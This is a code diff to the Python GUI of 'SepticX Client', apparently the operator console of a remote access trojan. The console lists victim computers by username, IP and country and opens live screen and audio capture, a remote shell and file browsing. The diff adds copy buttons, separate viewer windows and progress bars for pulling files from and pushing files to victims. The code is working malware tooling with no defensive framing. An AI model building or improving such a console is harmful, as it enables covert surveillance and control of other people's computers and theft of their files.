@@ -1,4 +1,5 @@
 from tkinter import *
+from CTkToolTip import *
 from random import randbytes
 from PIL import Image, ImageTk
 from colorama import Style, Fore
@@ -24,16 +25,16 @@ class Profile(customtkinter.CTkFrame):
             self.columnconfigure(i, weight= 1)
 
         if title:
-            emoji_widget = customtkinter.CTkButton(self, text="Country", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            emoji_widget = customtkinter.CTkButton(self, text="Country", fg_color="gray", text_color="Black", corner_radius=0)
             emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
 
-            username_widget = customtkinter.CTkButton(self, text="Desktop Username", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            username_widget = customtkinter.CTkButton(self, text="Desktop Username", fg_color="gray", text_color="Black", corner_radius=0)
             username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
 
-            ip_address_widget = customtkinter.CTkButton(self, text="Ip Address", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            ip_address_widget = customtkinter.CTkButton(self, text="Ip Address", fg_color="gray", text_color="Black", corner_radius=0)
             ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
 
-            address_widget = customtkinter.CTkButton(self, text="Other", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            address_widget = customtkinter.CTkButton(self, text="Other", fg_color="gray", text_color="Black", corner_radius=0)
             address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
             return
 
@@ -46,72 +47,23 @@ class Profile(customtkinter.CTkFrame):
         img = Image.open(io.BytesIO(response.content))
         image = customtkinter.CTkImage(dark_image=img, light_image=img)
 
-        emoji_widget = customtkinter.CTkButton(self, text="", image=image, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        emoji_widget = customtkinter.CTkButton(self, text="", image=image, fg_color="White", text_color="Black", command=lambda:(self.clipboard_clear(), self.clipboard_append(ipinfo['country'])), corner_radius=0)
         emoji_widget.grid(row=0, column=0, padx=0, sticky="nsew")
 
-        username_widget = customtkinter.CTkButton(self, text=username, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        CTkToolTip(emoji_widget, ipinfo['country'])
+
+        username_widget = customtkinter.CTkButton(self, text=username, fg_color="White", text_color="Black", command=lambda:(self.clipboard_clear(), self.clipboard_append(username)), corner_radius=0)
         username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
 
-        ip_address_widget = customtkinter.CTkButton(self, text=ip_address, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        CTkToolTip(username_widget, "Click to copy")
+
+        ip_address_widget = customtkinter.CTkButton(self, text=ip_address, fg_color="White", command=lambda:(self.clipboard_clear(), self.clipboard_append(ip_address)), text_color="Black", corner_radius=0)
         ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
 
-        address_widget = customtkinter.CTkButton(self, text="More options", command=lambda: Controller(parent, f"{username}|{ip_address}"), corner_radius=0)
-        address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+        CTkToolTip(ip_address_widget, "Click to copy")
 
-class File(customtkinter.CTkFrame):
-    def __init__(self, master, parent=None, filename="", config=None, row=0, rowspan=1, padx=20, pady=20, title=False, root=False):
-        super().__init__(master)
-
-        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")
-
-        for i in range(1): # Set 1 rows
-            self.rowconfigure(i, weight= 1)
-        
-        for i in range(7): # Set 7 columns
-            self.columnconfigure(i, weight= 1)
-
-        if title:
-            emoji_widget = customtkinter.CTkButton(self, text="File Name", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
-            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
-
-            username_widget = customtkinter.CTkButton(self, text="Date Modified", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
-            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
-
-            ip_address_widget = customtkinter.CTkButton(self, text="File Size", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
-            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
-
-            address_widget = customtkinter.CTkButton(self, text="Return", fg_color="red", text_color_disabled="Black", command=lambda: threading.Thread(target=parent.list_directory, args=('\\'.join(parent.current_directory.split("\\")[:-1]),)).start(), corner_radius=10)
-            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
-            return
-
-        date_modified = datetime.datetime.fromtimestamp(config['modified']).strftime("%Y/%m/%d %I:%M %p")
-        file_size = config['file_size']
-
-        if config['directory']:
-            filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1] if not root else filename, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
-            filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")
-
-            date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
-            date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
-
-            file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
-            file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
-
-            view_widget = customtkinter.CTkButton(self, text="View Directory", command=lambda: threading.Thread(target=parent.list_directory, args=(filename,)).start(), corner_radius=0)
-            view_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
-            return
-
-        filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
-        filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")
-
-        date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
-        date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
-
-        file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
-        file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
-
-        download_widget = customtkinter.CTkButton(self, text="Download", command=lambda: threading.Thread(target=parent.download, args=(filename,)).start(), corner_radius=0)
-        download_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+        control_widget = customtkinter.CTkButton(self, text="More options", command=lambda: Controller(parent, f"{username}|{ip_address}"), corner_radius=0)
+        control_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
 
 class Controller(customtkinter.CTkFrame):
     def __init__(self, master, target):
@@ -384,7 +336,7 @@ class Controller(customtkinter.CTkFrame):
         }))
 
 
-class Video(customtkinter.CTkFrame):
+class Video(customtkinter.CTkToplevel):
     def __init__(self, master, target, option=None):
         super().__init__(None)
 
@@ -398,8 +350,6 @@ class Video(customtkinter.CTkFrame):
         else:
             self.endpoint = "showScreen"
 
-        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
-
         btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
         btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")
 
@@ -407,9 +357,16 @@ class Video(customtkinter.CTkFrame):
             self.rowconfigure(i, weight= 1)
         
         for i in range(1): # Set 1 columns
-            self.columnconfigure(i, weight= 1)
+            self.columnconfigure(i, weight= 1)  
 
-        screen = customtkinter.CTkLabel(self, text="")
+        self.minsize(500, 300)
+        self.title(f"{target} Screen")
+        self.protocol("WM_DELETE_WINDOW", lambda: (self.kill_proc()))
+        self.lift()
+
+        self.width, self.height = (500, 300)
+    
+        screen = customtkinter.CTkLabel(self, text="Loading...")
         screen.grid(row=1, column=0, rowspan=10, sticky="nsew")
 
         self.screen = screen
@@ -422,9 +379,9 @@ class Video(customtkinter.CTkFrame):
         except AttributeError:
             self.after(50, self.update_display)
             return
-
-        image = customtkinter.CTkImage(dark_image=self.image, light_image=self.image, size=(1052, 592))
-        self.screen.configure(image=image)
+        
+        image = customtkinter.CTkImage(dark_image=self.image, light_image=self.image, size=(self.winfo_width()*0.975, self.winfo_height()*0.975))
+        self.screen.configure(image=image, text="")
         self.after(50, self.update_display)
 
     def get_display(self):
@@ -460,7 +417,7 @@ class Video(customtkinter.CTkFrame):
         self.destroy()
 
 
-class Audio(customtkinter.CTkFrame):
+class Audio(customtkinter.CTkToplevel):
     def __init__(self, master, target):
         super().__init__(None)
 
@@ -470,7 +427,10 @@ class Audio(customtkinter.CTkFrame):
         self.ws = master.ws
         self.stop = False
 
-        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+        self.minsize(300, 300)
+        self.title(f"{target} Audio")
+        self.lift()
+        self.protocol("WM_DELETE_WINDOW", lambda: (self.kill_proc()))
 
         btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
         btn.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
@@ -619,6 +579,88 @@ class Shell(customtkinter.CTkFrame):
             except (websocket.WebSocketException, WindowsError):
                 pass
 
+class ProgressBar(customtkinter.CTkToplevel):
+    def __init__(self, transfer_type="Upload"):
+        super().__init__(None)
+        self.geometry("400x300")
+        self.title("Progress Bar: 0%")
+        self.lift()
+
+        self.transfer_type = transfer_type
+
+        for i in range(2): # Set 2 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(1): # Set 1 columns
+            self.columnconfigure(i, weight= 1)
+
+        self.label = customtkinter.CTkLabel(self, text=f"{transfer_type} Progress: 0%")
+        self.label.grid(row=0, column=0, pady=10)
+
+        self.progress_bar = customtkinter.CTkProgressBar(master=self)
+        self.progress_bar.grid(row=1, column=0, pady=10)
+        self.progress_bar.set(0.01)
+
+    def update(self, value):
+        self.label.configure(text=f"{self.transfer_type} Progress: {round(value * 100)}%")
+        self.title(f"Progress Bar: {round(value * 100)}%")
+        self.progress_bar.set(value)
+        self.lift()
+
+class File(customtkinter.CTkFrame):
+    def __init__(self, master, parent=None, filename="", config=None, row=0, rowspan=1, padx=20, pady=20, title=False, root=False):
+        super().__init__(master)
+
+        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")
+
+        for i in range(1): # Set 1 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(7): # Set 7 columns
+            self.columnconfigure(i, weight= 1)
+
+        if title:
+            emoji_widget = customtkinter.CTkButton(self, text="File Name", fg_color="gray", text_color="Black", corner_radius=0)
+            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
+
+            username_widget = customtkinter.CTkButton(self, text="Date Modified", fg_color="gray", text_color="Black", corner_radius=0)
+            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+            ip_address_widget = customtkinter.CTkButton(self, text="File Size", fg_color="gray", text_color="Black", corner_radius=0)
+            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+            address_widget = customtkinter.CTkButton(self, text="Return", fg_color="red", text_color="Black", command=lambda: threading.Thread(target=parent.list_directory, args=('\\'.join(parent.current_directory.split("\\")[:-1]),)).start(), corner_radius=10)
+            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+            return
+
+        date_modified = datetime.datetime.fromtimestamp(config['modified']).strftime("%Y/%m/%d %I:%M %p")
+        file_size = config['file_size']
+
+        if config['directory']:
+            filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1] if not root else filename, fg_color="White", text_color="Black", corner_radius=0)
+            filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")
+
+            date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color="Black", corner_radius=0)
+            date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+            file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color="Black", corner_radius=0)
+            file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+            view_widget = customtkinter.CTkButton(self, text="View Directory", command=lambda: threading.Thread(target=parent.list_directory, args=(filename,)).start(), corner_radius=0)
+            view_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+            return
+
+        filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color="Black", corner_radius=0)
+        filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")
+
+        date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color="Black", corner_radius=0)
+        date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+        file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color="Black", corner_radius=0)
+        file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+        download_widget = customtkinter.CTkButton(self, text="Download", command=lambda: threading.Thread(target=parent.download, args=(filename, file_size)).start(), corner_radius=0)
+        download_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
 
 class FileManager(customtkinter.CTkFrame):
     def __init__(self, master, target):
@@ -678,7 +720,7 @@ class FileManager(customtkinter.CTkFrame):
             except (websocket.WebSocketException, WindowsError):
                 pass
 
-    def download(self, file_path):
+    def download(self, file_path, file_size):
         ws = create_connection(f"wss://{self.server_address}/api/ws/readFiles")
         ws.send(self.server_key)
         ws.send(self.target)
@@ -697,12 +739,20 @@ class FileManager(customtkinter.CTkFrame):
 
             open(filename, 'w+').close()
             break
+        
+        chunk_size = 65536
+        progress_bar = ProgressBar(transfer_type="Download")
+
+        count = 1
 
         with open(filename, 'ab') as file:
             while True:
                 try:
                     data = ws.recv()
+                    count += 1
+
                     if data == "FIN":
+                        progress_bar.destroy()
                         break
 
                     try:
@@ -711,10 +761,16 @@ class FileManager(customtkinter.CTkFrame):
                         print(z)
 
                     ws.send("ACK")
-                except (websocket.WebSocketException, WindowsError):
-                    break
 
+                except (websocket.WebSocketException, WindowsError):
+                    progress_bar.destroy()
+                    break
+                
+                progress = min(file_size / (chunk_size * count), 1)
+                progress_bar.update(progress)
+                
         tkinter.messagebox.showinfo("SepticX Client", "Successfully downloaded file, check the downloads folder.")
+        progress_bar.destroy()
 
     def upload(self):
         chunk_size = 65536
@@ -743,9 +799,8 @@ class FileManager(customtkinter.CTkFrame):
 
         # while True:
         self.ws.send(f"recv_file|{self.current_directory}\\{filename}")
-        print(self.ws.recv())
-
         time.sleep(5)
+        progress_bar = ProgressBar(transfer_type="Upload")
 
 
         with open(file_path, 'rb') as file:
@@ -755,29 +810,41 @@ class FileManager(customtkinter.CTkFrame):
             for count in range(math.ceil(length / chunk_size)):
                 chunk = data[count * chunk_size: (count + 1) * chunk_size]
 
+                timer = threading.Timer(30, ws.close)
+                timer.start()
+
+                progress = min((count + 1) / math.ceil(length / chunk_size), 1)
+
                 try:
                     ws.send(base64.b64encode(zlib.compress(chunk)))
-                except (websocket.WebSocketException, WindowsError, ConnectionError, OSError):
-                    break
+                except (websocket.WebSocketException, WindowsError, ConnectionError, OSError) as e:
+                    print(e)
+                    if timer.is_alive():
+                        tkinter.messagebox.showerror("SepticX Client", f"Connection died during upload")
+                        
+                    else:
+                        tkinter.messagebox.showerror("SepticX Client", f"Target timed out while sending")
+
+
+                    ws.close()
+                    progress_bar.destroy()
+                    return
 
                 timer = threading.Timer(15, ws.close)
                 canceled = False
                 timer.start()
 
                 try:
-                    print(ws.recv(), "OK MESSAGE SHOULD BE ACK")
+                    ws.recv() # ACK message
                 except (websocket.WebSocketException, WindowsError, ConnectionError, OSError, TimeoutError) as e:
-                    if timer.is_alive():
-                        tkinter.messagebox.showerror("SepticX Client", f"Connection died during upload")
-                        
-                    else:
-                        tkinter.messagebox.showerror("SepticX Client", f"Target timed out while recieving packet")
-
-                    ws.close()
-                    return
+                    ws = create_connection(f"wss://{self.server_address}/api/ws/files")
+                    ws.send(self.server_key)
+                    ws.send(self.target)
 
                 finally:
                     timer.cancel()
+
+                progress_bar.update(progress)
                     
 
         try:
@@ -785,8 +852,9 @@ class FileManager(customtkinter.CTkFrame):
             ws.close()
         except:
             pass
-
+        
         tkinter.messagebox.showinfo("SepticX Client", f"Successfully uploaded {filename} to {self.current_directory}")
+        progress_bar.destroy()
 
     def list_directory(self, directory):
         for child in self.scrollable_frame.winfo_children()[1:]:
@@ -933,7 +1001,7 @@ class App(customtkinter.CTk):
                 except (json.JSONDecodeError, websocket.WebSocketException, PermissionError, ConnectionError) as e:
                     print(e)
 
-            print(self.computers)
+            print("[LOG] New computer: ", self.computers)
 
             self.ws = ws
 
